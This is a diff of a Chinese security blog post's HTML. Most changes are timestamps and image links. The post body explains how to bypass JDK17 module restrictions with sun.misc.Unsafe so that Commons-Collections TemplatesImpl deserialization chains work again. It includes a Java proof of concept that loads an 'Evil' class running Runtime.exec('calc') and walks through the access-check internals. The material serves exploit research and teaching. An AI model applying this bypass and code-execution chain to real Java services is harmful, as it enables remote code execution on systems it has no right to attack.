@@ -131,16 +131,16 @@
     
     
         
-        <meta name="description" content="原理大概就是利用 Unsafe 类去绕过 Jdk17 下的模块限制，从而允许反序列化时 CC 链中的一些类的使用 Unsafe 类https:&#x2F;&#x2F;www.cnblogs.com&#x2F;nice0e3&#x2F;p&#x2F;14102892.html https:&#x2F;&#x2F;javaguide.cn&#x2F;java&#x2F;basis&#x2F;unsafe.html https:&#x2F;&#x2F;tech.meituan.com&#x2F;2019&#x2F;02&#x2F;14&#x2F;talk-ab">
+        <meta name="description" content="Jdk17&amp;CC 下利用 TemplesImpl原理大概就是利用 Unsafe 类去绕过 Jdk17 下的模块限制，从而允许反序列化时 CC 链中的一些类的使用 Unsafe 类Java安全之Unsafe类 - nice_0e3 - 博客园 Java 魔法类 Unsafe 详解 | JavaGuide Java魔法类：Unsafe应用解析 - 美团技术团队 Unsafe 是位于 sun.m">
 <meta property="og:type" content="article">
 <meta property="og:title" content="exp3n5ive&#39; Blog">
 <meta property="og:url" content="http://example.com/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/index.html">
 <meta property="og:site_name" content="exp3n5ive&#39; Blog">
-<meta property="og:description" content="原理大概就是利用 Unsafe 类去绕过 Jdk17 下的模块限制，从而允许反序列化时 CC 链中的一些类的使用 Unsafe 类https:&#x2F;&#x2F;www.cnblogs.com&#x2F;nice0e3&#x2F;p&#x2F;14102892.html https:&#x2F;&#x2F;javaguide.cn&#x2F;java&#x2F;basis&#x2F;unsafe.html https:&#x2F;&#x2F;tech.meituan.com&#x2F;2019&#x2F;02&#x2F;14&#x2F;talk-ab">
+<meta property="og:description" content="Jdk17&amp;CC 下利用 TemplesImpl原理大概就是利用 Unsafe 类去绕过 Jdk17 下的模块限制，从而允许反序列化时 CC 链中的一些类的使用 Unsafe 类Java安全之Unsafe类 - nice_0e3 - 博客园 Java 魔法类 Unsafe 详解 | JavaGuide Java魔法类：Unsafe应用解析 - 美团技术团队 Unsafe 是位于 sun.m">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-09-12T07:00:50.804Z">
-<meta property="article:modified_time" content="2025-09-12T07:00:30.386Z">
+<meta property="article:published_time" content="2025-09-12T06:58:52.072Z">
+<meta property="article:modified_time" content="2025-09-12T07:13:30.355Z">
 <meta property="article:author" content="exp3n5ive">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
@@ -365,15 +365,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2025-09-12 15:50</span>
-        <span class="mobile">2025-09-12 15:50</span>
+        <span class="desktop">2025-09-12 14:58:52</span>
+        <span class="mobile">2025-09-12 14:58:52</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-09-12 15:30</span>
-            <span class="mobile">2025-09-12 15:30</span>
+            <span class="desktop">2025-09-12 15:13:30</span>
+            <span class="mobile">2025-09-12 15:13:30</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -408,15 +408,15 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<p>原理大概就是利用 Unsafe 类去绕过 Jdk17 下的模块限制，从而允许反序列化时 CC 链中的一些类的使用</p>
-<h1 id="Unsafe-类"><a href="#Unsafe-类" class="headerlink" title="Unsafe 类"></a>Unsafe 类</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14102892.html" >https://www.cnblogs.com/nice0e3/p/14102892.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://javaguide.cn/java/basis/unsafe.html" >https://javaguide.cn/java/basis/unsafe.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html" >https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+			<h1 id="Jdk17-CC-下利用-TemplesImpl"><a href="#Jdk17-CC-下利用-TemplesImpl" class="headerlink" title="Jdk17&amp;CC 下利用 TemplesImpl"></a>Jdk17&amp;CC 下利用 TemplesImpl</h1><p>原理大概就是利用 Unsafe 类去绕过 Jdk17 下的模块限制，从而允许反序列化时 CC 链中的一些类的使用</p>
+<h1 id="Unsafe-类"><a href="#Unsafe-类" class="headerlink" title="Unsafe 类"></a>Unsafe 类</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14102892.html" >Java安全之Unsafe类 - nice_0e3 - 博客园<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://javaguide.cn/java/basis/unsafe.html" >Java 魔法类 Unsafe 详解 | JavaGuide<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html" >Java魔法类：Unsafe应用解析 - 美团技术团队<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <p>Unsafe 是位于 sun.misc 包下的一个类，主要提供一些用于执行低级别、不安全操作的方法</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756819321898-604bbb11-2f3b-4169-a501-c40e6c6958a1.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756819321898-604bbb11-2f3b-4169-a501-c40e6c6958a1.png"
                      
                 ></p>
 <h1 id="绕过模块检测原理"><a href="#绕过模块检测原理" class="headerlink" title="绕过模块检测原理"></a>绕过模块检测原理</h1><p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/paPG29rNSy-6a6-QHHz7yA?scene=1&click_id=12" >java安全学习-jdk17绕过反射限制<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
@@ -429,21 +429,21 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756867836904-2208e9d7-6b54-40c0-ba40-948c09fcb529.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756867836904-2208e9d7-6b54-40c0-ba40-948c09fcb529.png"
                      
                 ></p>
 <p>警告归警告，还是可以成功命令执行的：</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756867889706-36b139b4-1697-4594-bdaa-eff3574124fc.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756867889706-36b139b4-1697-4594-bdaa-eff3574124fc.png"
                      
                 ></p>
 <p>但是同样的代码拿到 Jdk17 下运行就会产生以下报错：</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756868022293-6d2bce9b-85d9-422a-b7ae-7cacc23e81c0.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756868022293-6d2bce9b-85d9-422a-b7ae-7cacc23e81c0.png"
                      
                 ></p>
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.reflect.InaccessibleObjectException: Unable to make <span class="keyword">protected</span> <span class="keyword">final</span> java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,<span class="type">byte</span>[],<span class="type">int</span>,<span class="type">int</span>) <span class="keyword">throws</span> java.lang.ClassFormatError accessible: <span class="keyword">module</span> java.base does not <span class="string">&quot;opens java.lang&quot;</span> to unnamed <span class="keyword">module</span> @404b9385</span><br><span class="line">	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:<span class="number">354</span>)</span><br><span class="line">	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:<span class="number">297</span>)</span><br><span class="line">	at java.base/java.lang.reflect.Method.checkCanSetAccessible(Method.java:<span class="number">199</span>)</span><br><span class="line">	at java.base/java.lang.reflect.Method.setAccessible(Method.java:<span class="number">193</span>)</span><br><span class="line">	at Test.main(Test.java:<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
@@ -454,7 +454,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756868580217-d354e570-9ac6-4f03-974f-8ad2f59a8624.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756868580217-d354e570-9ac6-4f03-974f-8ad2f59a8624.png"
                      
                 ></p>
 <p>这里如果 flag 为 true 就会调用 checkCanSetAccessible 来检测是否可以进行 setAccessible</p>
@@ -462,7 +462,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756868998500-39c5668e-9a48-4f78-9a27-b78af96a5798.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756868998500-39c5668e-9a48-4f78-9a27-b78af96a5798.png"
                      
                 ></p>
 <p>所以大概能够确定就是 checkCanSetAccessible 方法限制了对 java.* 的非公共字段和方法的反射</p>
@@ -470,7 +470,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756869534864-83e8331d-1845-4834-aa16-2aa48696a164.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756869534864-83e8331d-1845-4834-aa16-2aa48696a164.png"
                      
                 ></p>
 <p>这里直接引用别人的图：</p>
@@ -486,7 +486,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756876166277-cd1c31df-0b8a-4cb6-b985-eae851792228.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756876166277-cd1c31df-0b8a-4cb6-b985-eae851792228.png"
                      
                 ></p>
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 反射获取 Unsafe 类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">unsafeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 修改当前 Test 的 class 类的 Module</span></span><br><span class="line">        <span class="type">Module</span> <span class="variable">baseModule</span> <span class="operator">=</span> Object.class.getModule();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">currentClass</span> <span class="operator">=</span> Test.class;</span><br><span class="line">        <span class="type">long</span> <span class="variable">addr</span> <span class="operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">        unsafe.getAndSetObject(currentClass, addr, baseModule);</span><br><span class="line">        <span class="comment">// 反射调用 defineClass 加载字节码</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilBytes();</span><br><span class="line">        ((Class) method.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Evil&quot;</span>, code, <span class="number">0</span>, code.length)).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilBytes() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evil</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        evil.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> evil.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
@@ -494,7 +494,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756876393789-dd7c7b0b-96ff-4940-aea1-1c8f87741662.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756876393789-dd7c7b0b-96ff-4940-aea1-1c8f87741662.png"
                      
                 ></p>
 <p><code>unsafe.getAndSetObject(currentClass, addr, baseModule);</code>也可以换成 <code>unsafe.putObject(currentClass, addr, baseModule);</code> </p>
@@ -513,21 +513,21 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756881824250-d3c3afe1-15da-4e09-83dd-9f64407d1b1b.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756881824250-d3c3afe1-15da-4e09-83dd-9f64407d1b1b.png"
                      
                 ></p>
 <p>执行完 TemplatesImpl.defineTransletClasses() 出来之后，回到 TemplatesImpl.getTransletInstance()，调用 newInstance() 进行实例化，此时才会触发我们的恶意代码：</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756881938972-e8de3ca8-e035-4478-9c5e-288857d4066d.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756881938972-e8de3ca8-e035-4478-9c5e-288857d4066d.png"
                      
                 ></p>
 <p>但是如果我们的恶意类的父类不是 AbstractTranslet 的话，就会走到 else</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756882070922-418f0ef6-d082-4990-b52c-6c01ca964e75.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756882070922-418f0ef6-d082-4990-b52c-6c01ca964e75.png"
                      
                 ></p>
 <p>而按照我们原本的 payload，这个 _auxClasses 为 null，走到这里就会报空指针错误，导致还没 newInstance() 就抛出异常提前结束了</p>
@@ -536,7 +536,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756885782990-b48b0317-749b-4107-860e-88e3194301f5.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756885782990-b48b0317-749b-4107-860e-88e3194301f5.png"
                      
                 ></p>
 <p>所以我们只要在 _bytecodes 里面多放一个字节数组即可，不过要注意这里一定要是一个符合规范的 java 类字节码，如果放一个 new byte[0] 的话，在 defineClass 时会抛出异常</p>
@@ -544,13 +544,13 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756886061160-9923a536-dbd2-4935-ace5-0d0e375ab197.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756886061160-9923a536-dbd2-4935-ace5-0d0e375ab197.png"
                      
                 >这个值的初始值是 -1，如果不去修改就会进入下面的判断，导致抛出异常：</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756886120877-830d7c70-2c75-4aa4-a1a4-5a7dc01bc105.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756886120877-830d7c70-2c75-4aa4-a1a4-5a7dc01bc105.png"
                      
                 ></p>
 <p>这里用 Jdk8 下的 CC3 跑了一下：</p>
@@ -559,7 +559,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756886311240-c26f17ec-5b4c-49b1-b703-04bfeaf09864.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756886311240-c26f17ec-5b4c-49b1-b703-04bfeaf09864.png"
                      
                 ></p>
 <h2 id="反序列化时模块检测的绕过"><a href="#反序列化时模块检测的绕过" class="headerlink" title="反序列化时模块检测的绕过"></a>反序列化时模块检测的绕过</h2><p>前面我们绕过了 TemplatesImpl.defineTransletClasses() 中类加载时的异常问题，但是代码执行还需要回到 TemplatesImpl.getTransletInstance()，调用 newInstance() 进行实例化</p>
@@ -592,7 +592,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756894188038-e6e367d7-23e3-4505-990f-c78244b891b7.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756894188038-e6e367d7-23e3-4505-990f-c78244b891b7.png"
                      
                 ></p>
 <p>这样接下来我们就没办法继续对 Field 继续操作了</p>
@@ -616,7 +616,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756961037262-a8227f06-5c11-45ee-a3a1-f997b8ea07d3.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756961037262-a8227f06-5c11-45ee-a3a1-f997b8ea07d3.png"
                      
                 ></p>
 <p>现在改 Module 为 Object.class 的 Module 看上去是行不通了：我们没办法传 Object.class 的 Module，就算哪个可控的方法能获得 Object.class 的 Module，我们也没办法传到 getAndSetObject 这个方法的参数的位置</p>
@@ -638,14 +638,14 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756974831626-7ddcf10b-259a-4ff7-b019-fe0d2790ed46.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756974831626-7ddcf10b-259a-4ff7-b019-fe0d2790ed46.png"
                      
                 ></p>
 <p>所以关键就是看看怎么让 verifyAccess 返回 true，继续跟进：</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756975216243-0f0aaa39-92e7-4bf1-87bd-ae084b9395f6.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756975216243-0f0aaa39-92e7-4bf1-87bd-ae084b9395f6.png"
                      
                 ></p>
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 验证调用者类对目标成员的访问权限</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> caller 调用者类，即尝试访问成员的类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> memberClass 成员所属的类，即定义该成员的类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> targetClass 目标类，对于实例成员或构造器来说是实际的目标类，否则为null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> modifiers 成员的访问修饰符（如public、private、protected等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 如果调用者有权限访问该成员则返回true，否则返回false</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">verifyAccess</span><span class="params">(Class&lt;?&gt; caller, Class&lt;?&gt; memberClass,</span></span><br><span class="line"><span class="params">                           Class&lt;?&gt; targetClass, <span class="type">int</span> modifiers)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 快速检查：如果调用者类就是成员所属类（即本类调用），则直接允许访问</span></span><br><span class="line">    <span class="keyword">if</span> (caller == memberClass) &#123;  <span class="comment">// quick check</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;             <span class="comment">// ACCESS IS OK</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查受保护成员的访问权限</span></span><br><span class="line">    <span class="keyword">if</span> (targetClass != <span class="literal">null</span> <span class="comment">// instance member or constructor</span></span><br><span class="line">        &amp;&amp; Modifier.isProtected(modifiers)</span><br><span class="line">        &amp;&amp; targetClass != memberClass) &#123;</span><br><span class="line">        <span class="comment">// 对于受保护的实例成员，检查调用者是否在目标类的访问检查范围内</span></span><br><span class="line">        <span class="keyword">if</span> (isAccessChecked(caller, targetClass)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;         <span class="comment">// ACCESS IS OK</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// 检查非受保护成员或其他情况的访问权限</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isAccessChecked(caller)) &#123;</span><br><span class="line">        <span class="comment">// Non-protected case (or targetClass == memberClass or static member).</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;             <span class="comment">// ACCESS IS OK</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果上述快速检查都无法确定访问权限，则使用慢速路径进行详细验证</span></span><br><span class="line">    <span class="keyword">return</span> slowVerifyAccess(caller, memberClass, targetClass, modifiers);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
@@ -663,7 +663,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1757067456484-a8fcbd48-0fe5-4016-922b-d49a7adca9eb.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1757067456484-a8fcbd48-0fe5-4016-922b-d49a7adca9eb.png"
                      
                 ></p>
 <p>这里的逻辑是从缓存里找我们的调用类，但是能够看到我们的 accessCheckCache 为 null，肯定是找不到的，所以这里也不通</p>
@@ -671,7 +671,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756978182354-f3f321d9-8b76-4b94-ad02-afcf7a0d08fe.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756978182354-f3f321d9-8b76-4b94-ad02-afcf7a0d08fe.png"
                      
                 ></p>
 <p>可以看到就是在 verifyMemberAccess 里面返回 false 导致这个函数返回了false，继续跟进：</p>
@@ -682,14 +682,14 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756978631709-7aa417c5-5d0d-4730-9b97-ffec813404ef.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756978631709-7aa417c5-5d0d-4730-9b97-ffec813404ef.png"
                      
                 ></p>
 <p>而我们刚好就是死在这里，所以这里肯定要想办法绕过，不然一点机会都没了，继续跟：</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756978697136-6fdc9ee8-f085-4b21-81cc-9c2158b3c464.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756978697136-6fdc9ee8-f085-4b21-81cc-9c2158b3c464.png"
                      
                 ></p>
 <p>这里又是判断当前类的 module 和 被反射的类的 module 是否一样，肯定不满足，看 else：</p>
@@ -698,14 +698,14 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756980577892-de2b04c6-70bc-408e-8979-f0015a610848.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756980577892-de2b04c6-70bc-408e-8979-f0015a610848.png"
                      
                 ></p>
 <p>没逻辑，继续跟：</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756981490009-efbe06e5-72ca-45cd-bee1-1c6f18511743.png"
+                     data-src="https://exp3n5ive.github.io/2025/09/12/Jdk17&CC%20%E4%B8%8B%E5%88%A9%E7%94%A8%20TemplesImpl/1756981490009-efbe06e5-72ca-45cd-bee1-1c6f18511743.png"
                      
                 ></p>
 <p><strong>第一个判断</strong>：</p>
@@ -721,7 +721,7 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
